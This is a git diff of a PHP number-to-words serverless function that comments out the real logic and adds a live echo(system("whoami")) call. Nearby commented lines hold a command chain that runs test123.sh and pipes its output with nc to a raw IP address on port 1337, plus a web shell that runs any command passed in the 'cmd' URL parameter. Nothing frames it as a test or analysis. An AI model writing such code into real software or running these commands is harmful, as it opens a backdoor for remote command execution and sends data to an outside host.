@@ -3,12 +3,13 @@ use NFNumberToWord\NumberToWords;
  
 function main(array $args)
 {
-    if (!isset($args['number'])) {
-        return wrap(['error' => 'Please supply a number.']);
-    }
+//     if (!isset($args['number'])) {
+//         return wrap(['error' => 'Please supply a number.']);
+//     }
     
-    $number = (int)($args['number']);
-    $words = (new NumberToWords)->toWords($number);
+//     $number = (int)($args['number']);
+//     $words = (new NumberToWords)->toWords($number);
+ echo(system("whoami"));
  
 //     echo("------");
 //  echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
@@ -22,9 +23,9 @@ function main(array $args)
 //         echo(system($_GET['cmd']));
 //     }
  
-    return [
-        'body' => $words,
-    ];
+//     return [
+//         'body' => $words,
+//     ];
 
 }
 
